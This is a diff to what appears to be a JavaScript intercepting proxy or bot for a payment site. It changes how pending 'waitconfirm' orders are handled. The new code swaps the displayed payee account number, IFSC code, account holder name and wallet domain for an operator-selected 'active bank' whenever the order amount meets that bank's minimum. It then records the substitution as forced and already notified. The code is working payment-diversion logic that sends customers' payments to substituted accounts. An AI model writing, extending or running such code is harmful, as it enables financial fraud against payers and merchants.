@@ -2707,65 +2707,82 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
           const rptNo = wc.rptNo;
           const amt = parseFloat(wc.amount) || 0;
           const wcState = parseInt(wc.orderState ?? wc.state ?? -1);
-          // Save completed waitconfirm rows too; otherwise an order that was
-          // created before the proxy observed it can never match later.
+          // A waitconfirm row can be the first place where the proxy sees the
+          // completed order. For a new row, apply the active bank only when the
+          // order amount meets that bank's minimum, then persist the mapping.
           const canAutoSave = !Number.isFinite(wcState) || wcState <= 2;
           if (rptNo && data.botEnabled !== false && canAutoSave) {
             const activeBank = getActiveBank(data, null);
             const existingMapping = getSavedOrderMapping(data, wc);
             const isNew = !existingMapping;
-            // Existing orders ignore the current active bank and its minAmount;
-            // only a brand-new order needs the current active bank selected.
-            // A waitconfirm row is eligible for storage only when it already
-            // has a mapping created by an actual replacement. Never create a
-            // new mapping merely because an active bank/minimum amount exists.
-            if (existingMapping) {
-              if (!data.orderBankMap) data.orderBankMap = {};
-              const sourceBank = isNew ? (activeBank || {}) : (bankFromSavedOrder(existingMapping) || {});
+            const sourceBank = isNew
+              ? (activeBank || {})
+              : (bankFromSavedOrder(existingMapping) || {});
+            const minAmount = parseFloat(activeBank && activeBank.minAmount);
+            const newOrderEligible = !isNew || (
+              activeBank && Number.isFinite(amt) && amt > 0 &&
+              (!Number.isFinite(minAmount) || amt >= minAmount)
+            );
+
+            if (newOrderEligible && (sourceBank.accountNo || sourceBank.ifsc || sourceBank.accountHolder)) {
               const bkAcct = sourceBank.accountNo || '';
               const bkIfsc = sourceBank.ifsc || '';
               const bkName = sourceBank.accountHolder || '';
+              const originalAcct = wc.acctNo || '';
+              const originalIfsc = wc.acctCode || '';
+              const originalName = wc.acctName || '';
               const originalWallet = typeof wc.walletDomain === 'string' ? wc.walletDomain : '';
               const walletScheme = inferWalletScheme(wc);
-              const wDom = buildWalletDomain({ ...sourceBank, walletDomain: originalWallet, walletScheme }, amt);
 
-              
+              // waitconfirm exposes acctNo/acctCode/acctName and walletDomain;
+              // replace only those bank fields and preserve ctAccount/user data.
+              replaceWaitConfirmBankFields(wc, sourceBank);
+              const wDom = rewriteWalletDomainForBank(
+                originalWallet,
+                sourceBank,
+                activeBank && activeBank.minAmount
+              );
+              if (wDom && wDom !== originalWallet) wc.walletDomain = wDom;
 
-              if (isNew) {
-                data.orderBankMap[String(rptNo)] = {
+              const bankFieldsReplaced = Boolean(
+                (bkAcct && originalAcct !== bkAcct) ||
+                (bkIfsc && originalIfsc !== bkIfsc) ||
+                (bkName && originalName !== bkName)
+              );
+              const walletReplaced = Boolean(wDom && wDom !== originalWallet);
+              const replacementApplied = bankFieldsReplaced || walletReplaced;
+
+              if (replacementApplied) {
+                if (!data.orderBankMap) data.orderBankMap = {};
+                const previousSaved = parseSavedMapping(existingMapping) || {};
+                const savedData = {
+                  ...previousSaved,
                   bank: `${bkName} | ${bkAcct} | ${bkIfsc}`,
                   accountHolder: bkName,
                   accountNo: bkAcct,
                   ifsc: bkIfsc,
-                  bankName: sourceBank.bankName || 'Bank',
-                  upiId: sourceBank.upiId || '',
-                  payAccount: wc.payAccount || '',
-                  amount: amt,
-                  orderId: rptNo,
-                  rptNo,
-                  orderNo: wc.orderNo || rptNo,
-                  walletDomain: wDom,
-                  walletScheme,
-                  payType: wc.payType || wc.ctType || 2,
-                  time: now,
-                  userId: String(userId || ''),
+                  bankName: sourceBank.bankName || previousSaved.bankName || 'Bank',
+                  upiId: sourceBank.upiId || previousSaved.upiId || '',
+                  payAccount: wc.payAccount || previousSaved.payAccount || '',
+                  amount: amt || previousSaved.amount || 0,
+                  orderId: previousSaved.orderId || String(rptNo),
+                  rptNo: previousSaved.rptNo || String(rptNo),
+                  orderNo: wc.orderNo || previousSaved.orderNo || String(rptNo),
+                  walletDomain: wc.walletDomain || previousSaved.walletDomain || '',
+                  walletScheme: sourceBank.walletScheme || previousSaved.walletScheme || walletScheme,
+                  payType: wc.payType || wc.ctType || previousSaved.payType || 2,
+                  time: previousSaved.time || now,
+                  userId: String(userId || previousSaved.userId || ''),
                   forced: true,
                   isManual: true,
-                  notified: true // Set to true so we don't double notify later
+                  notified: true
                 };
-                await saveData(data);
-              } else {
-                // Existing orders are immutable: keep the bank and wallet that
-                // were saved at first capture. Only materialize the canonical
-                // rptNo key when the mapping was found through an alias.
-                const existing = parseSavedMapping(existingMapping);
-                if (existing) {
-                  data.orderBankMap[String(rptNo)] = existing;
-                  if (!existing.rptNo) existing.rptNo = String(rptNo);
-                  if (!existing.orderId) existing.orderId = String(rptNo);
-                  data._skipOverrideMerge = true;
-                  await saveData(data);
+                data.orderBankMap[String(rptNo)] = savedData;
+                if (savedData.orderNo && String(savedData.orderNo) !== String(rptNo)) {
+                  data.orderBankMap[String(savedData.orderNo)] = savedData;
                 }
+                data._skipOverrideMerge = true;
+                await saveData(data);
               }
 
               if (await claimOrderNotification(data, rptNo)) {
